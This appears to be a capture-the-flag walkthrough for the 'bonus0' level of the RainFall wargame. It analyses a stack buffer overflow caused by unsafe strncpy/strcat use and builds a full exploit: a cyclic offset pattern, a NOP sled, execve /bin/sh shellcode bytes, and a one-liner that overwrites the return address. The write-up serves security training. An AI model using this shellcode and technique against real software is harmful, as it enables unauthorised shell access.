# Bonus0 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    First, we `disas main` using gdb and after, `info functions`:
    We can see that there is functions :
    - `p` : reads user input and copies it to a buffer
    - `pp` : calls p() twice and then concatenate 2 buffers
    - `main` : calls pp() and prints the result

## Running the program

1. **Execute the Program with the Correct Input**:
    We can also use `ltrace ./bonus0`

    We ran the program with the following command:  
    ```bash
    bonus0@RainFall:~$ ./bonus0
    - 
    yo
    - 
    yo
    yo yo
    ```

    ```bash
    bonus0@RainFall:~$ ./bonus0 
    - 
    aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
    - 
    bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
    aaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbb��� bbbbbbbbbbbbbbbbbbbb���
    Segmentation fault (core dumped)
    ```

    it segfaults with a long strings.

    - Problems here : `disas main` + `disas pp` + `disas p`
        - On p() : `read` function read till 4096bytes but strncpy copied 20bytes, we can overflow the tmp buffer.
        - On pp() : `strcat` used without verifying if its less than 54bytes.

2. **Trying to overflow the RET value**
    - Lets try to know where we can try to write : 
    `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`

    Here we found that we overwritten on the `eip` register at the address `0x41336141`, its : `A3aA` but upside down we have to find `Aa3A`. 

    9th position!

    search for the 9th position, and simply replace this address by the address of our shellcode.
    Write over `eip` address and replace it by a random address betwenn the start address of our buffer (+61bytes) and the end of our padding.

    - Step1: NOP Sled + shell code anywhere greater than 61bytes
    ```bash
        `\x90" * 100` : NOP sled instructions qui augmente mes chances de succes en cas de decalage dans l'adresse exacte.
    ```

    - Step2:  Find our buffer[4104] address in order to determine the address between the start of our buffer + 61 and the end of the NOP sled instructions.
    ```bash
    (gdb) disas p
    [...] 
    0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax     <-------> buffer[4104] reference comme une zone de la stack situee a un deplacement negatif par rapport a %ebp, just do `print 0x1008`

    (gdb) b *0x080484d0
    Breakpoint 1 at 0x80484d0
    (gdb) r

    (gdb) x $ebp-0x1008
    0xbfffe670:     0x00000000
    ```

    - Choose an address between +61 and +100 because of the concatenation greater than [54], lets choose +100 : 
    ```bash
    (gdb) x $ebp-0x1008+100
    0xbfffe6d4:     0x00000000
    ```

    9 + 7 = 16 + 4bytes (address of shellcode) = 20 (because of the localbuffer[20])

    Exploit is : 
    ```bash
    (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd4\xe6\xff\xbf" + "B" * 7'; cat -) | ./bonus0
    ```

## Moving to bonus1

1. **Swith User to bonus1**:
    Run ```su bonus1```

2. **Authenticate with the Password**:
    We used the password we found.